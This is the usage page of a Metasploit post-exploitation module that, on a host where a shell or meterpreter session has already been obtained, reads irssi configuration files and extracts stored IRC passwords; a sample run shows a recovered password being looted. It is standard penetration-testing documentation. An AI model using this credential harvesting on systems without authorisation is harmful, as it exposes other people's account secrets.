## Vulnerable Application

  Any system with a `shell` or `meterpreter` session.

## Verification Steps

  1. Get a `shell` or `meterpreter` session on some host.
  2. Do: ```use post/multi/gather/irssi_creds```
  3. Do: ```set SESSION [SESSION_ID]```, replacing ```[SESSION_ID]``` with the session number you wish to run this one.
  4. Do: ```run```
  5. If the system has readable configuration files containing irc passwords, they will be printed out.

## Options

  None.

## Scenarios

```
msf post(irssi_creds) > run

[*] Finding ~/.irssi/config
[*] Looting 1 files
[+] Found a IRC password(s): chubbybunnies
[+] IRC password(s) stored in /Users/[REDACTED]/.msf/loot/20170405005410_default_[REDACTED]_irc.password_744582.txt
[*] Post module execution completed
```
